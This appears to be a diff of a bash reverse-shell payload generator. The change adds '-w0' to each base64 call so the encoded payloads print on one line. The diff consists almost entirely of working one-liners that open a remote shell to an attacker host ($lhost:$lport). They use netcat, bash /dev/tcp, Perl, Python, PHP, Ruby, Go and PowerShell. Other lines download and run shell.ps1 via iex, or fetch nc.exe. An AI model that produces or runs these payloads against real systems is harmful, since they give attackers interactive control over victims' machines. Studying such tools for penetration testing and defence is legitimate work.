@@ -46,53 +46,53 @@ case $langu in
 	1)
 	 echo "nc $lhost $lport -e /bin/bash"
 	 echo -e "${YELLOW}And in base64 encoding! ${NC}"
-	 echo "nc $lhost $lport -e /bin/bash" |base64;;
+	 echo "nc $lhost $lport -e /bin/bash" |base64 -w0;;
 
 	1b)
           echo ".\nc.exe $lhost $lport -e cmd"
 	  echo -e "${YELLOW}And in base64 encoding! ${NC}"
-	  echo ".\nc.exe $lhost $lport -e cmd" |base64;;
+	  echo ".\nc.exe $lhost $lport -e cmd" |base64 -w0;;
 
 	2)
 	 echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $lhost $lport >/tmp/f"
 	 echo -e "${YELLOW}And in base64 encoding! ${NC}"
-	 echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $lhost $lport >/tmp/f" |base64;;
+	 echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $lhost $lport >/tmp/f" |base64 -w0;;
 
 	3)
 	 echo "bash -i >& /dev/tcp/$lhost/$lport 0>&1"
 	 echo -e "${YELLOW}And in base64 encoding! ${NC}"
-	 echo "bash -i >& /dev/tcp/$lhost/$lport 0>&1" |base64;;
+	 echo "bash -i >& /dev/tcp/$lhost/$lport 0>&1" |base64 -w0;;
 
 	4)
 	 echo "perl -e 'use Socket;$i="$lhost";$p=$lport;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"
 	 echo -e "${YELLOW}And in base64 encoding! ${NC}"
-	 echo "perl -e 'use Socket;$i="$lhost";$p=$lport;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'" |base64;;
+	 echo "perl -e 'use Socket;$i="$lhost";$p=$lport;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'" |base64 -w0;;
 
 	5)
 	 echo "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$lhost",$lport));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
 	 echo -e "${YELLOW}And in base64 encoding! ${NC}"
-	 echo "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$lhost",$lport));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'" |base64;;
+	 echo "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$lhost",$lport));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'" |base64 -w0;;
 
 
 	6)
 	 echo "php -r '$sock=fsockopen("$lhost",$lport);exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
 	 echo -e "${YELLOW}And in base64 encoding! ${NC}"
-	 echo "php -r '$sock=fsockopen("$lhost",$lport);exec(\"/bin/sh -i <&3 >&3 2>&3\");'" |base64;;
+	 echo "php -r '$sock=fsockopen("$lhost",$lport);exec(\"/bin/sh -i <&3 >&3 2>&3\");'" |base64 -w0;;
 
 	7)
 	 echo "ruby -rsocket -e'f=TCPSocket.open("$lhost",$lport).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"
 	 echo -e "${YELLOW}And in base64 encoding! ${NC}"
-	 echo "ruby -rsocket -e'f=TCPSocket.open("$lhost",$lport).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'" |base64;;
+	 echo "ruby -rsocket -e'f=TCPSocket.open("$lhost",$lport).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'" |base64 -w0;;
 
 	8)
 	 echo "echo 'package main;import\"os/exec\";import\"net\";func main(){c,_:=net.Dial(\"tcp\","lhost:$lport");cmd:=exec.Command(\"/bin/sh\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go"
 	 echo -e "${YELLOW}And in base64 encoding! ${NC}"
-	 echo "echo 'package main;import\"os/exec\";import\"net\";func main(){c,_:=net.Dial(\"tcp\","$lhost:$lport");cmd:=exec.Command(\"/bin/sh\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go" |base64;;
+	 echo "echo 'package main;import\"os/exec\";import\"net\";func main(){c,_:=net.Dial(\"tcp\","$lhost:$lport");cmd:=exec.Command(\"/bin/sh\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go" |base64 -w0;;
 
 	9)
 	 echo "powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('$lhost',$lport);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\""
 	 echo -e "${YELLOW}And in base64 encoding! ${NC}"
-	 echo "powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('$lhost',$lport);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"" |base64;;
+	 echo "powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('$lhost',$lport);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"" |base64 -w0;;
 
 
 	9a)
@@ -100,7 +100,7 @@ case $langu in
 	 echo -e "${YELLOW}Remember to copy shell.ps1 to the PWD in Kali, and amend the last line! Then set a python server running! ${NC}"
 	 echo -e "${YELLOW}python3 -m http.server 80${NC}"
 	 echo -e "${YELLOW}And in base64 encoding! ${NC}"
-	 echo "powershell -c iex(New-Object Net.WebClient).DownloadString('http://$lhost/shell.ps1')" |base64;;
+	 echo "powershell -c iex(New-Object Net.WebClient).DownloadString('http://$lhost/shell.ps1')" |base64 -w0;;
 
 
 	9b)
@@ -108,7 +108,7 @@ case $langu in
 	 echo -e "${YELLOW}Dont forget to create 'boo' directory first, and serve file with a python server!${NC}"
 	 echo -e "${YELLOW}python3 -m http.server 80${NC}"
 	 echo -e "${YELLOW}And in base64 encoding! ${NC}"
-	 echo "powershell Invoke-WebRequest -uri http://$lhost/nc.exe -outfile c:\boo\nc.exe" |base64;;
+	 echo "powershell Invoke-WebRequest -uri http://$lhost/nc.exe -outfile c:\boo\nc.exe" |base64 -w0;;
 
 
 	*)
